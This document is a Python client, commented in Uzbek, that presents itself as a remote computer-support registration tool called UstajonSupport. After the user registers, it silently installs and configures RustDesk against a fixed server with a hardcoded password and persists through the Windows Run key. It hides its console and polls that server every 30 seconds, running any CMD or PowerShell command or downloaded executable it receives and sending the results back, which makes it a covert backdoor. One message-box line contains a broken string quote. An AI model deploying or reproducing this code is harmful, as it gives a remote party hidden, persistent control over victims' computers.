#!/usr/bin/env python3
"""
UstajonSupport Client v4.1 - Silent Background Service + Remote Commands
- Bir marta royxatdan otadi
- Yashirin rejimda ishlaydi
- Windows startupga qoshiladi
- RustDesk yashirin ornatiladi
- Heartbeat har 30 sekundda
- Masofadan CMD buyruqlarini qabul qiladi
"""
import os
import sys
import json
import socket
import platform
import subprocess
import threading
import time
import urllib.request
import urllib.parse
import hashlib
import logging
import re
from datetime import datetime

VERSION = "4.1.0"
APP_NAME = "UstajonSupport"
SERVER_URL = "http://31.220.75.75"
RUSTDESK_KEY = "YHo+N4vp+ZWP7wedLh69zCGk3aFf4935hwDKX9OdFXE="
RUSTDESK_SERVER = "31.220.75.75"
RUSTDESK_PASSWORD = "ustajon2025"
RUSTDESK_URL = "https://github.com/rustdesk/rustdesk/releases/download/1.2.3/rustdesk-1.2.3-x86_64.exe"
TELEGRAM_BOT = "@ustajonbot"

APP_DATA = os.path.join(os.environ.get("APPDATA", ""), APP_NAME)
os.makedirs(APP_DATA, exist_ok=True)
CONFIG_FILE = os.path.join(APP_DATA, "config.json")
LOG_FILE = os.path.join(APP_DATA, "service.log")

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.FileHandler(LOG_FILE, encoding="utf-8")]
)
logger = logging.getLogger(__name__)

try:
    import ctypes
    import winreg
    WINDOWS = True
except:
    WINDOWS = False

def hide_console():
    if WINDOWS:
        try:
            ctypes.windll.kernel32.FreeConsole()
        except:
            pass

def add_to_startup():
    if not WINDOWS:
        return False
    try:
        exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                            r"Software\Microsoft\Windows\CurrentVersion\Run", 
                            0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, APP_NAME, 0, winreg.REG_SZ, f'"{exe_path}" --silent')
        winreg.CloseKey(key)
        logger.info("Startupga qoshildi")
        return True
    except Exception as e:
        logger.error(f"Startup xato: {e}")
        return False

class Config:
    def __init__(self):
        self.data = self._load()
    
    def _load(self):
        try:
            if os.path.exists(CONFIG_FILE):
                with open(CONFIG_FILE, "r", encoding="utf-8") as f:
                    return json.load(f)
        except:
            pass
        return {}
    
    def save(self):
        try:
            with open(CONFIG_FILE, "w", encoding="utf-8") as f:
                json.dump(self.data, f, indent=2)
        except:
            pass
    
    def get(self, key, default=None):
        return self.data.get(key, default)
    
    def set(self, key, value):
        self.data[key] = value
        self.save()
    
    def is_registered(self):
        return self.get("registered", False) and self.get("rustdesk_id")


class RustDeskManager:
    @staticmethod
    def find():
        paths = [
            os.path.expandvars(r"%ProgramFiles%\RustDesk\rustdesk.exe"),
            os.path.expandvars(r"%ProgramFiles(x86)%\RustDesk\rustdesk.exe"),
            r"C:\Program Files\RustDesk\rustdesk.exe",
        ]
        for p in paths:
            if os.path.exists(p):
                return p
        return None
    
    @staticmethod
    def download_and_install():
        try:
            logger.info("RustDesk yuklanmoqda...")
            temp = os.path.join(os.environ.get("TEMP", ""), "rustdesk_setup.exe")
            urllib.request.urlretrieve(RUSTDESK_URL, temp)
            si = subprocess.STARTUPINFO()
            si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            si.wShowWindow = 0
            subprocess.run([temp, "--silent-install"], startupinfo=si, capture_output=True, timeout=300)
            time.sleep(5)
            try:
                os.remove(temp)
            except:
                pass
            return RustDeskManager.find()
        except Exception as e:
            logger.error(f"RustDesk ornatish xato: {e}")
            return None
    
    @staticmethod
    def configure(exe_path):
        try:
            cfg_dir = os.path.join(os.environ.get("APPDATA", ""), "RustDesk", "config")
            os.makedirs(cfg_dir, exist_ok=True)
            config = f'''rendezvous_server = "{RUSTDESK_SERVER}"
nat_type = 1
serial = 0

[options]
custom-rendezvous-server = "{RUSTDESK_SERVER}"
relay-server = "{RUSTDESK_SERVER}"
key = "{RUSTDESK_KEY}"
direct-server = "Y"
'''
            with open(os.path.join(cfg_dir, "RustDesk2.toml"), "w") as f:
                f.write(config)
            si = subprocess.STARTUPINFO()
            si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            si.wShowWindow = 0
            try:
                subprocess.run([exe_path, "--password", RUSTDESK_PASSWORD], startupinfo=si, capture_output=True, timeout=30)
            except:
                pass
            logger.info("RustDesk sozlandi")
            return True
        except Exception as e:
            logger.error(f"RustDesk sozlash xato: {e}")
            return False
    
    @staticmethod
    def start_hidden(exe_path):
        try:
            si = subprocess.STARTUPINFO()
            si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            si.wShowWindow = 0
            subprocess.Popen([exe_path, "--tray"], startupinfo=si, creationflags=0x08000000)
            logger.info("RustDesk yashirin ishga tushdi")
            return True
        except Exception as e:
            logger.error(f"RustDesk ishga tushirish xato: {e}")
            return False
    
    @staticmethod
    def get_id():
        appdata = os.environ.get("APPDATA", "")
        toml_path = os.path.join(appdata, "RustDesk", "config", "RustDesk.toml")
        for _ in range(30):
            try:
                if os.path.exists(toml_path):
                    with open(toml_path, "r", encoding="utf-8") as f:
                        content = f.read()
                    match = re.search(r'^id\s*=\s*[\'"]?(\d{9,})[\'"]?', content, re.MULTILINE)
                    if match:
                        return match.group(1)
            except:
                pass
            time.sleep(1)
        exe = RustDeskManager.find()
        if exe:
            try:
                si = subprocess.STARTUPINFO()
                si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                si.wShowWindow = 0
                result = subprocess.run([exe, "--get-id"], capture_output=True, text=True, startupinfo=si, timeout=10)
                if result.stdout:
                    id_val = result.stdout.strip()
                    if id_val and len(id_val) >= 6:
                        return id_val
            except:
                pass
        return None
    
    @staticmethod
    def is_running():
        try:
            si = subprocess.STARTUPINFO()
            si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            si.wShowWindow = 0
            result = subprocess.run(["tasklist", "/FI", "IMAGENAME eq rustdesk.exe"], capture_output=True, text=True, startupinfo=si)
            return "rustdesk.exe" in result.stdout.lower()
        except:
            return False


class RemoteCommand:
    """Masofadan buyruqlarni bajarish"""
    
    @staticmethod
    def execute(command, timeout=60):
        """CMD buyruqni yashirin bajarish"""
        try:
            si = subprocess.STARTUPINFO()
            si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            si.wShowWindow = 0
            
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=timeout,
                startupinfo=si,
                creationflags=0x08000000
            )
            
            output = result.stdout + result.stderr
            return {
                "success": True,
                "output": output[:5000],  # Max 5000 chars
                "exit_code": result.returncode
            }
        except subprocess.TimeoutExpired:
            return {"success": False, "output": "Timeout - buyruq juda uzoq davom etdi", "exit_code": -1}
        except Exception as e:
            return {"success": False, "output": str(e), "exit_code": -1}
    
    @staticmethod
    def execute_powershell(script, timeout=60):
        """PowerShell script yashirin bajarish"""
        try:
            si = subprocess.STARTUPINFO()
            si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            si.wShowWindow = 0
            
            result = subprocess.run(
                ["powershell", "-ExecutionPolicy", "Bypass", "-Command", script],
                capture_output=True,
                text=True,
                timeout=timeout,
                startupinfo=si,
                creationflags=0x08000000
            )
            
            output = result.stdout + result.stderr
            return {
                "success": True,
                "output": output[:5000],
                "exit_code": result.returncode
            }
        except Exception as e:
            return {"success": False, "output": str(e), "exit_code": -1}
    
    @staticmethod
    def get_system_info():
        """Tizim haqida malumot"""
        info = {
            "hostname": socket.gethostname(),
            "platform": platform.system(),
            "release": platform.release(),
            "version": platform.version(),
            "machine": platform.machine(),
            "processor": platform.processor(),
            "username": os.environ.get("USERNAME", "unknown"),
            "ip": socket.gethostbyname(socket.gethostname())
        }
        return info
    
    @staticmethod
    def download_and_run(url, filename=None):
        """Fayl yuklab ishga tushirish"""
        try:
            if not filename:
                filename = url.split("/")[-1]
            temp = os.path.join(os.environ.get("TEMP", ""), filename)
            urllib.request.urlretrieve(url, temp)
            
            si = subprocess.STARTUPINFO()
            si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            si.wShowWindow = 0
            
            subprocess.Popen([temp], startupinfo=si, creationflags=0x08000000)
            return {"success": True, "output": f"Yuklab ishga tushirildi: {temp}"}
        except Exception as e:
            return {"success": False, "output": str(e)}


class SilentService:
    def __init__(self):
        self.config = Config()
        self.running = True
        self.client_id = None
        self.rustdesk_id = None
    
    def setup_rustdesk(self):
        exe = RustDeskManager.find()
        if not exe:
            logger.info("RustDesk topilmadi, ornatilmoqda...")
            exe = RustDeskManager.download_and_install()
            if not exe:
                return False
        RustDeskManager.configure(exe)
        if not RustDeskManager.is_running():
            RustDeskManager.start_hidden(exe)
            time.sleep(3)
        self.rustdesk_id = RustDeskManager.get_id()
        if self.rustdesk_id:
            self.config.set("rustdesk_id", self.rustdesk_id)
            logger.info(f"RustDesk ID: {self.rustdesk_id}")
            return True
        return False
    
    def register(self, name, phone, problem="Texnik yordam"):
        try:
            self.client_id = hashlib.md5(phone.encode()).hexdigest()[:12].upper()
            data = {
                "client_id": self.client_id,
                "name": name,
                "phone": phone,
                "problem": problem,
                "rustdesk_id": self.rustdesk_id,
                "hostname": socket.gethostname(),
                "os_info": f"{platform.system()} {platform.release()}",
                "version": VERSION
            }
            encoded = urllib.parse.urlencode(data).encode()
            req = urllib.request.Request(f"{SERVER_URL}/api/agent/register", data=encoded, method="POST")
            req.add_header("Content-Type", "application/x-www-form-urlencoded")
            resp = urllib.request.urlopen(req, timeout=30)
            result = json.loads(resp.read().decode())
            if result.get("success"):
                self.config.set("name", name)
                self.config.set("phone", phone)
                self.config.set("client_id", self.client_id)
                self.config.set("registered", True)
                self.config.set("registered_at", datetime.now().isoformat())
                logger.info(f"Royxatdan otildi: {name}")
                return True
            return False
        except Exception as e:
            logger.error(f"Royxatdan otish xato: {e}")
            return False
    
    def check_commands(self):
        """Serverdan buyruqlarni tekshirish"""
        try:
            client_id = self.config.get("client_id")
            req = urllib.request.Request(f"{SERVER_URL}/api/agent/commands?client_id={client_id}")
            resp = urllib.request.urlopen(req, timeout=10)
            result = json.loads(resp.read().decode())
            
            commands = result.get("commands", [])
            for cmd in commands:
                cmd_id = cmd.get("id")
                cmd_type = cmd.get("type", "cmd")
                cmd_data = cmd.get("command", "")
                
                logger.info(f"Buyruq qabul qilindi: {cmd_type} - {cmd_data[:50]}")
                
                # Buyruqni bajarish
                if cmd_type == "cmd":
                    output = RemoteCommand.execute(cmd_data)
                elif cmd_type == "powershell":
                    output = RemoteCommand.execute_powershell(cmd_data)
                elif cmd_type == "sysinfo":
                    output = {"success": True, "output": json.dumps(RemoteCommand.get_system_info(), indent=2)}
                elif cmd_type == "download":
                    url = cmd.get("url", cmd_data)
                    output = RemoteCommand.download_and_run(url)
                else:
                    output = {"success": False, "output": "Nomalum buyruq turi"}
                
                # Natijani serverga yuborish
                self.send_command_result(cmd_id, output)
                
        except Exception as e:
            logger.debug(f"Buyruq tekshirish xato: {e}")
    
    def send_command_result(self, cmd_id, result):
        """Buyruq natijasini serverga yuborish"""
        try:
            data = {
                "client_id": self.config.get("client_id"),
                "command_id": cmd_id,
                "success": result.get("success", False),
                "output": result.get("output", ""),
                "exit_code": result.get("exit_code", 0)
            }
            encoded = json.dumps(data).encode()
            req = urllib.request.Request(
                f"{SERVER_URL}/api/agent/command-result",
                data=encoded,
                method="POST"
            )
            req.add_header("Content-Type", "application/json")
            urllib.request.urlopen(req, timeout=10)
            logger.info(f"Buyruq natijasi yuborildi: {cmd_id}")
        except Exception as e:
            logger.error(f"Natija yuborish xato: {e}")
    
    def heartbeat(self):
        while self.running:
            try:
                # RustDesk tekshirish
                if not RustDeskManager.is_running():
                    exe = RustDeskManager.find()
                    if exe:
                        RustDeskManager.start_hidden(exe)
                
                # Heartbeat yuborish
                data = {
                    "client_id": self.config.get("client_id"),
                    "rustdesk_id": self.config.get("rustdesk_id"),
                    "status": "online",
                    "hostname": socket.gethostname(),
                    "version": VERSION
                }
                encoded = urllib.parse.urlencode(data).encode()
                req = urllib.request.Request(f"{SERVER_URL}/api/agent/heartbeat", data=encoded, method="POST")
                req.add_header("Content-Type", "application/x-www-form-urlencoded")
                resp = urllib.request.urlopen(req, timeout=10)
                result = json.loads(resp.read().decode())
                
                if result.get("deleted"):
                    logger.info("Server tomonidan ochirildi")
                    self.config.set("registered", False)
                    self.running = False
                    break
                
                # Buyruqlarni tekshirish
                self.check_commands()
                
            except Exception as e:
                logger.warning(f"Heartbeat xato: {e}")
            
            time.sleep(30)
    
    def run_silent(self):
        logger.info(f"{APP_NAME} v{VERSION} yashirin rejimda boshlandi")
        if not self.setup_rustdesk():
            logger.error("RustDesk sozlab bolmadi")
            return
        add_to_startup()
        self.heartbeat()


def show_registration_ui():
    import tkinter as tk
    from tkinter import ttk, messagebox
    
    service = SilentService()
    
    root = tk.Tk()
    root.title(f"{APP_NAME}")
    root.geometry("420x480")
    root.resizable(False, False)
    root.configure(bg="#0f172a")
    
    root.update_idletasks()
    x = (root.winfo_screenwidth() - 420) // 2
    y = (root.winfo_screenheight() - 480) // 2
    root.geometry(f"420x480+{x}+{y}")
    
    tk.Label(root, text=APP_NAME, font=("Segoe UI", 24, "bold"), fg="#fff", bg="#0f172a").pack(pady=(40, 5))
    tk.Label(root, text="Kompyuter xizmati", font=("Segoe UI", 11), fg="#94a3b8", bg="#0f172a").pack()
    
    frame = tk.Frame(root, bg="#1e293b", padx=25, pady=20)
    frame.pack(fill="x", padx=25, pady=20)
    
    tk.Label(frame, text="Ismingiz", font=("Segoe UI", 10, "bold"), fg="#94a3b8", bg="#1e293b").pack(anchor="w")
    name_var = tk.StringVar()
    tk.Entry(frame, textvariable=name_var, font=("Segoe UI", 12), bg="#0f172a", fg="#fff", insertbackground="#6366f1", relief="flat", bd=8).pack(fill="x", pady=(5, 12))
    
    tk.Label(frame, text="Telefon raqam", font=("Segoe UI", 10, "bold"), fg="#94a3b8", bg="#1e293b").pack(anchor="w")
    phone_var = tk.StringVar(value="+998")
    tk.Entry(frame, textvariable=phone_var, font=("Segoe UI", 12), bg="#0f172a", fg="#fff", insertbackground="#6366f1", relief="flat", bd=8).pack(fill="x", pady=(5, 12))
    
    tk.Label(frame, text="Muammo turi", font=("Segoe UI", 10, "bold"), fg="#94a3b8", bg="#1e293b").pack(anchor="w")
    problems = ["Kompyuter sekin", "Virus", "Dastur ornatish", "Internet", "Boshqa"]
    problem_var = tk.StringVar(value=problems[0])
    ttk.Combobox(frame, textvariable=problem_var, values=problems, font=("Segoe UI", 11), state="readonly").pack(fill="x", pady=(5, 15))
    
    status_label = tk.Label(frame, text="", font=("Segoe UI", 10), fg="#94a3b8", bg="#1e293b")
    status_label.pack()
    
    def submit():
        name = name_var.get().strip()
        phone = phone_var.get().strip()
        if not name or len(name) < 2:
            messagebox.showerror("Xatolik", "Ismingizni kiriting!")
            return
        if not phone or len(phone) < 12 or not phone.startswith("+998"):
            messagebox.showerror("Xatolik", "Telefon: +998XXXXXXXXX")
            return
        status_label.config(text="RustDesk sozlanmoqda...", fg="#f59e0b")
        root.update()
        if not service.setup_rustdesk():
            status_label.config(text="RustDesk xatolik!", fg="#ef4444")
            return
        status_label.config(text="Royxatdan otilmoqda...", fg="#f59e0b")
        root.update()
        if service.register(name, phone, problem_var.get()):
            messagebox.showinfo("Tayyor, f"Royxatdan otdingiz!\n\nTelegram: {TELEGRAM_BOT}\n\nMutaxassis tez orada ulanadi.")
            root.destroy()
            hide_console()
            service.run_silent()
        else:
            status_label.config(text="Xatolik! Qayta urining", fg="#ef4444")
    
    tk.Button(frame, text="Yuborish", font=("Segoe UI", 12, "bold"), bg="#6366f1", fg="#fff", relief="flat", bd=0, padx=20, pady=10, cursor="hand2", command=submit).pack(fill="x", pady=(10, 0))
    tk.Label(root, text=f"v{VERSION} | {TELEGRAM_BOT}", font=("Segoe UI", 9), fg="#64748b", bg="#0f172a").pack(side="bottom", pady=15)
    root.mainloop()


def main():
    if "--silent" in sys.argv:
        hide_console()
    config = Config()
    if config.is_registered():
        hide_console()
        service = SilentService()
        service.client_id = config.get("client_id")
        service.rustdesk_id = config.get("rustdesk_id")
        service.run_silent()
    else:
        show_registration_ui()


if __name__ == "__main__":
    main()
